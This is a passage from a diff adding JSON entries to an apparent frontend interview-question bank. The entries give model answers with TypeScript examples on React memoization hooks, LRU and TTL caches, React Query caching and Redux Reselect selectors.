+      "answer": "## Core Difference\n\n```typescript\n// useMemo: Memoizes a COMPUTED VALUE\nconst expensiveValue = useMemo(() => {\n  return computeExpensiveValue(a, b);\n}, [a, b]);\n\n// useCallback: Memoizes a FUNCTION REFERENCE\nconst handleClick = useCallback(() => {\n  doSomething(a, b);\n}, [a, b]);\n\n// useCallback is actually syntactic sugar for:\nconst handleClick = useMemo(() => {\n  return () => doSomething(a, b);\n}, [a, b]);\n```\n\n## When to Use useMemo\n\n### 1. Expensive Calculations\n\n```typescript\nfunction ProductList({ products, filters }: Props) {\n  // âœ… Good: Filtering/sorting large arrays\n  const filteredProducts = useMemo(() => {\n    return products\n      .filter(p => p.category === filters.category)\n      .filter(p => p.price >= filters.minPrice)\n      .sort((a, b) => a.price - b.price);\n  }, [products, filters.category, filters.minPrice]);\n\n  return (\n    <ul>\n      {filteredProducts.map(product => (\n        <ProductCard key={product.id} product={product} />\n      ))}\n    </ul>\n  );\n}\n```\n\n### 2. Referential Equality for useEffect\n\n```typescript\nfunction SearchResults({ query }: { query: string }) {\n  // âœ… Good: Object reference used in dependency array\n  const searchParams = useMemo(() => ({\n    query,\n    limit: 20,\n    offset: 0,\n  }), [query]);\n\n  useEffect(() => {\n    fetchResults(searchParams);\n  }, [searchParams]); // Won't re-run unless query changes\n\n  // âŒ Bad: New object every render\n  useEffect(() => {\n    fetchResults({ query, limit: 20, offset: 0 });\n  }, [{ query, limit: 20, offset: 0 }]); // Always re-runs!\n}\n```\n\n### 3. Passing to Memoized Children\n\n```typescript\nconst MemoizedChart = memo(function Chart({ data }: { data: DataPoint[] }) {\n  // Expensive chart rendering\n  return <svg>...</svg>;\n});\n\nfunction Dashboard({ rawData }: { rawData: RawData[] }) {\n  // âœ… Good: Stable reference for memo'd child\n  const chartData = useMemo(() => {\n    return rawData.map(d => ({\n      x: d.timestamp,\n      y: d.value,\n    }));\n  }, [rawData]);\n\n  return <MemoizedChart data={chartData} />;\n}\n```\n\n## When to Use useCallback\n\n### 1. Passing Callbacks to Memoized Children\n\n```typescript\nconst MemoizedButton = memo(function Button({ \n  onClick, \n  label \n}: { \n  onClick: () => void; \n  label: string;\n}) {\n  console.log('Button rendered');\n  return <button onClick={onClick}>{label}</button>;\n});\n\nfunction Parent() {\n  const [count, setCount] = useState(0);\n  \n  // âœ… Good: Stable function reference\n  const handleClick = useCallback(() => {\n    setCount(c => c + 1);\n  }, []); // No dependencies - uses updater function\n\n  return (\n    <>\n      <span>Count: {count}</span>\n      <MemoizedButton onClick={handleClick} label=\"Increment\" />\n    </>\n  );\n}\n```\n\n### 2. Dependencies in useEffect\n\n```typescript\nfunction SearchComponent({ userId }: { userId: string }) {\n  // âœ… Good: Stable function for effect dependency\n  const fetchUserData = useCallback(async () => {\n    const response = await fetch(`/api/users/${userId}`);\n    return response.json();\n  }, [userId]);\n\n  useEffect(() => {\n    fetchUserData().then(setUser);\n  }, [fetchUserData]);\n}\n```\n\n### 3. Custom Hooks Returning Functions\n\n```typescript\nfunction useDebounce<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  delay: number\n): T {\n  // âœ… Good: Return stable debounced function\n  return useCallback(\n    debounce(fn, delay) as T,\n    [fn, delay]\n  );\n}\n```\n\n## Common Pitfalls\n\n### 1. Premature Optimization\n\n```typescript\n// âŒ Bad: Unnecessary memoization\nfunction SimpleComponent({ name }: { name: string }) {\n  // This is overkill - string concatenation is fast\n  const greeting = useMemo(() => `Hello, ${name}!`, [name]);\n  \n  // This is overkill - function is cheap to create\n  const handleClick = useCallback(() => {\n    console.log('clicked');\n  }, []);\n\n  return <div onClick={handleClick}>{greeting}</div>;\n}\n\n// âœ… Good: Just use plain values\nfunction SimpleComponent({ name }: { name: string }) {\n  const greeting = `Hello, ${name}!`;\n  const handleClick = () => console.log('clicked');\n  \n  return <div onClick={handleClick}>{greeting}</div>;\n}\n```\n\n### 2. Missing Dependencies\n\n```typescript\nfunction Counter() {\n  const [count, setCount] = useState(0);\n  \n  // âŒ Bad: Stale closure - always logs 0\n  const logCount = useCallback(() => {\n    console.log(count);\n  }, []); // Missing 'count' dependency\n\n  // âœ… Good: Use ref for latest value without re-creating\n  const countRef = useRef(count);\n  countRef.current = count;\n  \n  const logCount = useCallback(() => {\n    console.log(countRef.current);\n  }, []);\n}\n```\n\n### 3. Object/Array Dependencies\n\n```typescript\nfunction Component({ config }: { config: { theme: string } }) {\n  // âŒ Bad: New object every render breaks memoization\n  const handleClick = useCallback(() => {\n    applyTheme(config);\n  }, [config]); // config is new object each render!\n\n  // âœ… Good: Depend on primitive values\n  const handleClick = useCallback(() => {\n    applyTheme({ theme: config.theme });\n  }, [config.theme]);\n}\n```\n\n### 4. useMemo for JSX\n\n```typescript\n// âŒ Bad: Don't memoize JSX (use memo() instead)\nfunction Parent({ items }: { items: Item[] }) {\n  const list = useMemo(() => (\n    <ul>\n      {items.map(item => <li key={item.id}>{item.name}</li>)}\n    </ul>\n  ), [items]);\n  \n  return <div>{list}</div>;\n}\n\n// âœ… Good: Use memo for component-level optimization\nconst ItemList = memo(function ItemList({ items }: { items: Item[] }) {\n  return (\n    <ul>\n      {items.map(item => <li key={item.id}>{item.name}</li>)}\n    </ul>\n  );\n});\n```\n\n## Decision Framework\n\n```\nShould I use useMemo/useCallback?\nâ”‚\nâ”œâ”€â–º Is this fixing a measured performance problem?\nâ”‚   â””â”€â–º No â†’ Don't use it (premature optimization)\nâ”‚\nâ”œâ”€â–º Is the value passed to a memo'd child?\nâ”‚   â””â”€â–º Yes â†’ Consider useMemo/useCallback\nâ”‚\nâ”œâ”€â–º Is the value in a useEffect dependency array?\nâ”‚   â””â”€â–º Yes â†’ Probably need useMemo/useCallback\nâ”‚\nâ”œâ”€â–º Is the computation expensive (>1ms)?\nâ”‚   â””â”€â–º Yes â†’ Use useMemo\nâ”‚\nâ””â”€â–º Profile first, optimize second\n```",
+      "keyPoints": [
+        "Knows useMemo is for values, useCallback is for functions",
+        "Understands referential equality for dependency arrays",
+        "Can identify premature optimization",
+        "Knows common pitfalls (stale closures, missing deps)",
+        "Understands when NOT to use memoization"
+      ],
+      "followUpQuestions": [
+        "How would you measure if memoization is actually helping?",
+        "What's the memory cost of excessive memoization?",
+        "How does React.memo differ from useMemo?",
+        "When would useMemo re-compute even with same dependencies?"
+      ],
+      "relatedTopics": [
+        "react-memo",
+        "performance",
+        "hooks",
+        "referential-equality"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Meta",
+        "Airbnb",
+        "Netflix"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-003",
+      "category": "caching-memoization",
+      "difficulty": "senior",
+      "question": "How would you implement a memoization function that handles complex objects as arguments? What about cache eviction strategies?",
+      "answer": "## Basic Memoization\n\n```typescript\n// Simple memoization with primitive arguments\nfunction memoize<T extends (...args: unknown[]) => unknown>(fn: T): T {\n  const cache = new Map<string, ReturnType<T>>();\n  \n  return ((...args: Parameters<T>) => {\n    const key = JSON.stringify(args);\n    \n    if (cache.has(key)) {\n      return cache.get(key)!;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n\n// Usage\nconst expensiveCalculation = memoize((a: number, b: number) => {\n  console.log('Computing...');\n  return a * b;\n});\n\nexpensiveCalculation(2, 3); // Computing... â†’ 6\nexpensiveCalculation(2, 3); // â†’ 6 (cached)\n```\n\n## Handling Complex Objects\n\n### Problem with JSON.stringify\n\n```typescript\n// âŒ Issues with JSON.stringify:\n// 1. Order sensitivity: {a:1,b:2} !== {b:2,a:1}\n// 2. Can't handle circular references\n// 3. Loses functions, undefined, symbols\n// 4. Date objects become strings\n\nconst obj1 = { a: 1, b: 2 };\nconst obj2 = { b: 2, a: 1 };\nJSON.stringify(obj1) !== JSON.stringify(obj2); // Different strings!\n```\n\n### Solution 1: Stable Serialization\n\n```typescript\nfunction stableStringify(obj: unknown): string {\n  if (obj === null || typeof obj !== 'object') {\n    return JSON.stringify(obj);\n  }\n  \n  if (Array.isArray(obj)) {\n    return '[' + obj.map(stableStringify).join(',') + ']';\n  }\n  \n  // Sort keys for consistent ordering\n  const keys = Object.keys(obj).sort();\n  const pairs = keys.map(key => \n    `\"${key}\":${stableStringify((obj as Record<string, unknown>)[key])}`\n  );\n  \n  return '{' + pairs.join(',') + '}';\n}\n\nfunction memoizeWithStableKeys<T extends (...args: unknown[]) => unknown>(fn: T): T {\n  const cache = new Map<string, ReturnType<T>>();\n  \n  return ((...args: Parameters<T>) => {\n    const key = stableStringify(args);\n    \n    if (cache.has(key)) {\n      return cache.get(key)!;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n```\n\n### Solution 2: WeakMap for Object References\n\n```typescript\n// For single object argument - uses reference equality\nfunction memoizeOne<T extends (arg: object) => unknown>(fn: T): T {\n  const cache = new WeakMap<object, ReturnType<T>>();\n  \n  return ((arg: object) => {\n    if (cache.has(arg)) {\n      return cache.get(arg)!;\n    }\n    \n    const result = fn(arg) as ReturnType<T>;\n    cache.set(arg, result);\n    return result;\n  }) as T;\n}\n\n// For multiple arguments - nested WeakMaps\nfunction memoizeMultipleObjects<T extends (...args: object[]) => unknown>(fn: T): T {\n  const cache = new WeakMap<object, WeakMap<object, unknown>>();\n  \n  return ((...args: object[]) => {\n    let current: WeakMap<object, unknown> = cache;\n    \n    for (let i = 0; i < args.length - 1; i++) {\n      if (!current.has(args[i])) {\n        current.set(args[i], new WeakMap());\n      }\n      current = current.get(args[i]) as WeakMap<object, unknown>;\n    }\n    \n    const lastArg = args[args.length - 1];\n    if (current.has(lastArg)) {\n      return current.get(lastArg) as ReturnType<T>;\n    }\n    \n    const result = fn(...args);\n    current.set(lastArg, result);\n    return result as ReturnType<T>;\n  }) as T;\n}\n```\n\n## Cache Eviction Strategies\n\n### 1. LRU (Least Recently Used)\n\n```typescript\nclass LRUCache<K, V> {\n  private cache = new Map<K, V>();\n  private maxSize: number;\n\n  constructor(maxSize: number) {\n    this.maxSize = maxSize;\n  }\n\n  get(key: K): V | undefined {\n    if (!this.cache.has(key)) {\n      return undefined;\n    }\n    \n    // Move to end (most recently used)\n    const value = this.cache.get(key)!;\n    this.cache.delete(key);\n    this.cache.set(key, value);\n    \n    return value;\n  }\n\n  set(key: K, value: V): void {\n    // Delete if exists (to update position)\n    if (this.cache.has(key)) {\n      this.cache.delete(key);\n    }\n    \n    // Evict oldest if at capacity\n    if (this.cache.size >= this.maxSize) {\n      const oldestKey = this.cache.keys().next().value;\n      this.cache.delete(oldestKey);\n    }\n    \n    this.cache.set(key, value);\n  }\n}\n\nfunction memoizeWithLRU<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  maxSize = 100\n): T {\n  const cache = new LRUCache<string, ReturnType<T>>(maxSize);\n  \n  return ((...args: Parameters<T>) => {\n    const key = stableStringify(args);\n    const cached = cache.get(key);\n    \n    if (cached !== undefined) {\n      return cached;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T;\n}\n```\n\n### 2. TTL (Time-To-Live)\n\n```typescript\ninterface CacheEntry<V> {\n  value: V;\n  expiry: number;\n}\n\nclass TTLCache<K, V> {\n  private cache = new Map<K, CacheEntry<V>>();\n  private ttl: number;\n\n  constructor(ttlMs: number) {\n    this.ttl = ttlMs;\n  }\n\n  get(key: K): V | undefined {\n    const entry = this.cache.get(key);\n    \n    if (!entry) {\n      return undefined;\n    }\n    \n    if (Date.now() > entry.expiry) {\n      this.cache.delete(key);\n      return undefined;\n    }\n    \n    return entry.value;\n  }\n\n  set(key: K, value: V): void {\n    this.cache.set(key, {\n      value,\n      expiry: Date.now() + this.ttl,\n    });\n  }\n\n  // Periodic cleanup\n  cleanup(): void {\n    const now = Date.now();\n    for (const [key, entry] of this.cache) {\n      if (now > entry.expiry) {\n        this.cache.delete(key);\n      }\n    }\n  }\n}\n```\n\n### 3. LRU + TTL Combined\n\n```typescript\nclass LRUTTLCache<K, V> {\n  private cache = new Map<K, { value: V; expiry: number }>();\n  private maxSize: number;\n  private ttl: number;\n\n  constructor(maxSize: number, ttlMs: number) {\n    this.maxSize = maxSize;\n    this.ttl = ttlMs;\n  }\n\n  get(key: K): V | undefined {\n    const entry = this.cache.get(key);\n    \n    if (!entry) return undefined;\n    \n    // Check TTL\n    if (Date.now() > entry.expiry) {\n      this.cache.delete(key);\n      return undefined;\n    }\n    \n    // LRU: Move to end\n    this.cache.delete(key);\n    this.cache.set(key, entry);\n    \n    return entry.value;\n  }\n\n  set(key: K, value: V): void {\n    // Remove if exists\n    this.cache.delete(key);\n    \n    // Evict if full\n    if (this.cache.size >= this.maxSize) {\n      const oldestKey = this.cache.keys().next().value;\n      this.cache.delete(oldestKey);\n    }\n    \n    this.cache.set(key, {\n      value,\n      expiry: Date.now() + this.ttl,\n    });\n  }\n}\n```\n\n### 4. Size-Based Eviction\n\n```typescript\nclass SizeLimitedCache<K, V> {\n  private cache = new Map<K, V>();\n  private sizes = new Map<K, number>();\n  private currentSize = 0;\n  private maxSize: number;\n  \n  constructor(maxSizeBytes: number) {\n    this.maxSize = maxSizeBytes;\n  }\n\n  private estimateSize(value: V): number {\n    const str = JSON.stringify(value);\n    return str.length * 2; // Rough estimate (UTF-16)\n  }\n\n  set(key: K, value: V): void {\n    const size = this.estimateSize(value);\n    \n    // Remove old entry if exists\n    if (this.cache.has(key)) {\n      this.currentSize -= this.sizes.get(key)!;\n      this.cache.delete(key);\n      this.sizes.delete(key);\n    }\n    \n    // Evict until we have space\n    while (this.currentSize + size > this.maxSize && this.cache.size > 0) {\n      const oldestKey = this.cache.keys().next().value;\n      this.currentSize -= this.sizes.get(oldestKey)!;\n      this.cache.delete(oldestKey);\n      this.sizes.delete(oldestKey);\n    }\n    \n    this.cache.set(key, value);\n    this.sizes.set(key, size);\n    this.currentSize += size;\n  }\n}\n```\n\n## Production-Ready Memoization\n\n```typescript\ninterface MemoizeOptions {\n  maxSize?: number;\n  ttl?: number;\n  keyGenerator?: (...args: unknown[]) => string;\n  onEvict?: (key: string, value: unknown) => void;\n}\n\nfunction memoize<T extends (...args: unknown[]) => unknown>(\n  fn: T,\n  options: MemoizeOptions = {}\n): T & { cache: { clear: () => void; size: number } } {\n  const {\n    maxSize = 1000,\n    ttl = Infinity,\n    keyGenerator = stableStringify,\n    onEvict,\n  } = options;\n\n  const cache = new LRUTTLCache<string, ReturnType<T>>(maxSize, ttl);\n\n  const memoized = ((...args: Parameters<T>) => {\n    const key = keyGenerator(args);\n    const cached = cache.get(key);\n    \n    if (cached !== undefined) {\n      return cached;\n    }\n    \n    const result = fn(...args) as ReturnType<T>;\n    cache.set(key, result);\n    return result;\n  }) as T & { cache: { clear: () => void; size: number } };\n\n  memoized.cache = {\n    clear: () => cache.clear(),\n    get size() { return cache.size; },\n  };\n\n  return memoized;\n}\n```",
+      "keyPoints": [
+        "Understands serialization challenges with objects",
+        "Knows WeakMap for reference-based memoization",
+        "Can implement LRU cache from scratch",
+        "Understands TTL and size-based eviction",
+        "Considers memory management in caching"
+      ],
+      "followUpQuestions": [
+        "How would you handle async functions?",
+        "What about cache warming strategies?",
+        "How would you implement cache sharing across tabs?",
+        "What are the tradeoffs between different eviction strategies?"
+      ],
+      "relatedTopics": [
+        "data-structures",
+        "memory-management",
+        "performance"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Google",
+        "Meta",
+        "Netflix"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-004",
+      "category": "caching-memoization",
+      "difficulty": "mid",
+      "question": "How does React Query (TanStack Query) implement its caching layer? Explain staleTime, gcTime, and the query lifecycle.",
+      "answer": "## React Query Cache Architecture\n\n```\nâ”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”\nâ”‚                    QueryClient                          â”‚\nâ”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤\nâ”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”   â”‚\nâ”‚  â”‚              QueryCache                          â”‚   â”‚\nâ”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚\nâ”‚  â”‚  â”‚  Query: ['users', 1]                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ state: { data, error, status }     â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ observers: [Component1, Component2]â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â”œâ”€â”€ staleTime: 5000                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â””â”€â”€ gcTime: 300000                     â”‚    â”‚   â”‚\nâ”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚\nâ”‚  â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚   â”‚\nâ”‚  â”‚  â”‚  Query: ['users', 2]                    â”‚    â”‚   â”‚\nâ”‚  â”‚  â”‚  â””â”€â”€ ...                                â”‚    â”‚   â”‚\nâ”‚  â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚   â”‚\nâ”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜   â”‚\nâ””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜\n```\n\n## Key Timing Concepts\n\n### staleTime (Data Freshness)\n\n```typescript\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: fetchUser,\n  staleTime: 5 * 60 * 1000, // 5 minutes\n});\n\n// Timeline:\n// T=0: Fetch completes, data is FRESH\n// T=0 to T=5min: Data is FRESH\n//   - New components mounting get cached data immediately\n//   - No background refetch\n// T=5min+: Data becomes STALE\n//   - Still returns cached data immediately\n//   - Triggers background refetch on:\n//     â€¢ Component mount\n//     â€¢ Window focus\n//     â€¢ Network reconnect\n```\n\n### gcTime (Garbage Collection Time, formerly cacheTime)\n\n```typescript\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: fetchUser,\n  gcTime: 30 * 60 * 1000, // 30 minutes\n});\n\n// Timeline:\n// T=0: Component mounts, fetch starts\n// T=1s: Fetch completes, data cached\n// T=10s: Component unmounts (no more observers)\n//   - Query enters \"inactive\" state\n//   - gcTime countdown starts\n// T=10s to T=30min+10s: Data stays in cache\n//   - If component remounts: instant data + possible refetch\n// T=30min+10s: Data garbage collected\n//   - If component mounts now: loading state, fresh fetch\n```\n\n## Query Lifecycle States\n\n```typescript\ntype QueryStatus = 'pending' | 'error' | 'success';\ntype FetchStatus = 'fetching' | 'paused' | 'idle';\n\n// State machine:\n// \n// Initial Mount:\n//   status: 'pending', fetchStatus: 'fetching'\n//   â””â”€â–º Fetch completes\n//       status: 'success', fetchStatus: 'idle'\n//\n// Cached Data Available:\n//   status: 'success', fetchStatus: 'idle'  (if fresh)\n//   status: 'success', fetchStatus: 'fetching' (if stale, background refetch)\n//\n// Error:\n//   status: 'error', fetchStatus: 'idle'\n//   â””â”€â–º Retry\n//       status: 'error', fetchStatus: 'fetching'\n\nfunction UserProfile({ userId }: { userId: string }) {\n  const { data, status, fetchStatus, isLoading, isFetching } = useQuery({\n    queryKey: ['user', userId],\n    queryFn: () => fetchUser(userId),\n  });\n\n  // isLoading = status === 'pending' (no data yet)\n  // isFetching = fetchStatus === 'fetching' (request in flight)\n  \n  // First load: isLoading=true, isFetching=true\n  // Background refetch: isLoading=false, isFetching=true\n  \n  if (isLoading) {\n    return <Skeleton />;\n  }\n  \n  return (\n    <div>\n      {isFetching && <RefreshIndicator />}\n      <UserCard user={data} />\n    </div>\n  );\n}\n```\n\n## Cache Invalidation\n\n```typescript\nconst queryClient = useQueryClient();\n\n// 1. Invalidate specific query\nqueryClient.invalidateQueries({ queryKey: ['user', userId] });\n\n// 2. Invalidate all queries starting with 'user'\nqueryClient.invalidateQueries({ queryKey: ['user'] });\n\n// 3. Invalidate with predicate\nqueryClient.invalidateQueries({\n  predicate: (query) => \n    query.queryKey[0] === 'user' && \n    query.state.dataUpdatedAt < Date.now() - 60000,\n});\n\n// 4. Optimistic update\nconst mutation = useMutation({\n  mutationFn: updateUser,\n  onMutate: async (newUser) => {\n    // Cancel in-flight queries\n    await queryClient.cancelQueries({ queryKey: ['user', newUser.id] });\n    \n    // Snapshot previous value\n    const previousUser = queryClient.getQueryData(['user', newUser.id]);\n    \n    // Optimistically update\n    queryClient.setQueryData(['user', newUser.id], newUser);\n    \n    return { previousUser };\n  },\n  onError: (err, newUser, context) => {\n    // Rollback on error\n    queryClient.setQueryData(['user', newUser.id], context?.previousUser);\n  },\n  onSettled: () => {\n    // Refetch to ensure consistency\n    queryClient.invalidateQueries({ queryKey: ['user'] });\n  },\n});\n```\n\n## Query Deduplication\n\n```typescript\n// Multiple components using same query key\nfunction ComponentA() {\n  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });\n  return <div>{data?.name}</div>;\n}\n\nfunction ComponentB() {\n  const { data } = useQuery({ queryKey: ['user', 1], queryFn: fetchUser });\n  return <div>{data?.email}</div>;\n}\n\nfunction App() {\n  return (\n    <>\n      <ComponentA />\n      <ComponentB />\n    </>\n  );\n}\n\n// Result: Only ONE fetch request!\n// Both components share the same cached query instance\n```\n\n## Prefetching\n\n```typescript\nconst queryClient = useQueryClient();\n\n// Prefetch on hover\nfunction UserLink({ userId }: { userId: string }) {\n  const prefetchUser = () => {\n    queryClient.prefetchQuery({\n      queryKey: ['user', userId],\n      queryFn: () => fetchUser(userId),\n      staleTime: 5000, // Don't prefetch if we have fresh data\n    });\n  };\n\n  return (\n    <Link \n      to={`/users/${userId}`}\n      onMouseEnter={prefetchUser}\n    >\n      View User\n    </Link>\n  );\n}\n\n// Prefetch in route loader (React Router)\nexport const loader = async ({ params }: LoaderFunctionArgs) => {\n  await queryClient.ensureQueryData({\n    queryKey: ['user', params.userId],\n    queryFn: () => fetchUser(params.userId!),\n  });\n  return null;\n};\n```\n\n## Best Practices\n\n```typescript\n// 1. Global defaults\nconst queryClient = new QueryClient({\n  defaultOptions: {\n    queries: {\n      staleTime: 60 * 1000, // 1 minute\n      gcTime: 5 * 60 * 1000, // 5 minutes\n      retry: 3,\n      refetchOnWindowFocus: true,\n    },\n  },\n});\n\n// 2. Query key factory pattern\nconst userKeys = {\n  all: ['users'] as const,\n  lists: () => [...userKeys.all, 'list'] as const,\n  list: (filters: UserFilters) => [...userKeys.lists(), filters] as const,\n  details: () => [...userKeys.all, 'detail'] as const,\n  detail: (id: string) => [...userKeys.details(), id] as const,\n};\n\n// Usage\nqueryClient.invalidateQueries({ queryKey: userKeys.all }); // All user queries\nqueryClient.invalidateQueries({ queryKey: userKeys.lists() }); // All lists\nqueryClient.invalidateQueries({ queryKey: userKeys.detail(userId) }); // Specific user\n\n// 3. Placeholder data for better UX\nconst { data } = useQuery({\n  queryKey: ['user', userId],\n  queryFn: () => fetchUser(userId),\n  placeholderData: (previousData) => previousData, // Keep showing old data\n});\n```",
+      "keyPoints": [
+        "Understands staleTime vs gcTime difference",
+        "Knows query status and fetch status states",
+        "Can explain query deduplication",
+        "Understands optimistic updates pattern",
+        "Knows prefetching strategies",
+        "Familiar with query key factory pattern"
+      ],
+      "followUpQuestions": [
+        "How would you handle dependent queries?",
+        "What's the difference between invalidate and reset?",
+        "How does React Query handle pagination/infinite queries?",
+        "How would you implement offline persistence?"
+      ],
+      "relatedTopics": [
+        "react-query",
+        "state-management",
+        "data-fetching"
+      ],
+      "source": "seed",
+      "commonAt": [
+        "Most modern React companies"
+      ],
+      "createdAt": "2025-12-31T22:18:47.424Z",
+      "updatedAt": "2025-12-31T22:18:47.424Z",
+      "isArchived": false
+    },
+    {
+      "id": "caching-memoization-005",
+      "category": "caching-memoization",
+      "difficulty": "mid",
+      "question": "Explain the concept of selector memoization in Redux. How does Reselect work, and when would you create custom equality checks?",
+      "answer": "## Why Selectors Need Memoization\n\n```typescript\n// Without memoization - creates new array every time\nconst selectFilteredTodos = (state: RootState) => {\n  // This runs on EVERY state change, even unrelated ones\n  return state.todos.filter(todo => !todo.completed);\n};\n\nfunction TodoList() {\n  // New array reference every render = infinite re-renders with useEffect\n  const todos = useSelector(selectFilteredTodos);\n  \n  useEffect(() => {\n    console.log('Todos changed!');\n  }, [todos]); // Triggers every time!\n}\n```\n\n## Reselect Fundamentals\n\n```typescript\nimport { createSelector } from '@reduxjs/toolkit';\n\n// Input selectors - extract pieces of state\nconst selectTodos = (state: RootState) => state.todos;\nconst selectFilter = (state: RootState) => state.filter;\n\n// Memoized selector - only recomputes when inputs change\nconst selectFilteredTodos = createSelector(\n  [selectTodos, selectFilter],\n  (todos, filter) => {\n    // This transformation only runs if todos or filter changed\n    switch (filter) {\n      case 'active':\n        return todos.filter(todo => !todo.completed);\n      case 'completed':\n        return todos.filter(todo => todo.completed);\n      default:\n        return todos;\n    }\n  }\n);\n\n// Usage\nconst todos = useSelector(selectFilteredTodos);\n// Returns same reference if inputs unchanged!\n```\n\n## How Reselect Works Internally\n\n```typescript\n// Simplified implementation\nfunction createSelector<S, R1, R2, Result>(\n  selector1: (state: S) => R1,\n  selector2: (state: S) => R2,\n  combiner: (res1: R1, res2: R2) => Result\n): (state: S) => Result {\n  let lastArgs: [R1, R2] | null = null;\n  let lastResult: Result | null = null;\n\n  return (state: S) => {\n    const newArgs: [R1, R2] = [selector1(state), selector2(state)];\n    \n    // Check if any input changed (reference equality)\n    if (\n      lastArgs !== null &&\n      newArgs[0] === lastArgs[0] &&\n      newArgs[1] === lastArgs[1]\n    ) {\n      return lastResult!;\n    }\n    \n    // Recompute\n    lastArgs = newArgs;\n    lastResult = combiner(newArgs[0], newArgs[1]);\n    return lastResult;\n  };\n}\n```\n\n## Composing Selectors\n\n```typescript\n// Base selectors\nconst selectUsers = (state: RootState) => state.users;\nconst selectPosts = (state: RootState) => state.posts;\nconst selectCurrentUserId = (state: RootState) => state.auth.userId;\n\n// Composed selector\nconst selectCurrentUser = createSelector(\n  [selectUsers, selectCurrentUserId],\n  (users, userId) => users.find(u => u.id === userId)\n);\n\n// Further composition\nconst selectCurrentUserPosts = createSelector(\n  [selectPosts, selectCurrentUserId],\n  (posts, userId) => posts.filter(p => p.authorId === userId)\n);\n\n// Multiple levels deep\nconst selectCurrentUserPostsWithStats = createSelector(\n  [selectCurrentUserPosts],\n  (posts) => ({\n    posts,\n    totalCount: posts.length,\n    publishedCount: posts.filter(p => p.published).length,\n  })\n);\n```\n\n## Parameterized Selectors\n\n```typescript\n// âŒ Bad: Creates new selector instance every render\nconst selectTodoById = (state: RootState, todoId: string) =>\n  createSelector(\n    [selectTodos],\n    (todos) => todos.find(t => t.id === todoId)\n  )(state);\n\n// âœ… Good: Factory pattern\nconst makeSelectTodoById = () =>\n  createSelector(\n    [selectTodos, (state: RootState, todoId: string) => todoId],\n    (todos, todoId) => todos.find(t => t.id === todoId)\n  );\n\n// Usage in component\nfunction TodoItem({ todoId }: { todoId: string }) {\n  // Create selector instance once per component\n  const selectTodoById = useMemo(makeSelectTodoById, []);\n  const todo = useSelector((state) => selectTodoById(state, todoId));\n  \n  return <div>{todo?.title}</div>;\n}\n\n// âœ… Better with RTK: createSelector with cache\nimport { createSelector } from '@reduxjs/toolkit';\n\nconst selectTodoById = createSelector(\n  [selectTodos, (state: RootState, todoId: 